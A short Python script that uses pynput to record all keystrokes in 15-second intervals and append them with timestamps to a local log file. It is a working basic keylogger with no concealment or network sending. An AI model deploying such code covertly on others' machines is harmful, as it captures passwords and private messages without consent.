import time, datetime, csv
from pynput import keyboard

key_presses = []

def on_press(key):
    try:
        key_presses.append(key.char)
    except AttributeError:
        key_presses.append(key)

if __name__ == "__main__":
    while True:
        key_presses = []
        timestamp = datetime.datetime.now()
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        time.sleep(15)
        listener.stop()
        with open("key-press.log", "a") as f:
            f.write("{}: {}\n".format(timestamp, str(key_presses)))

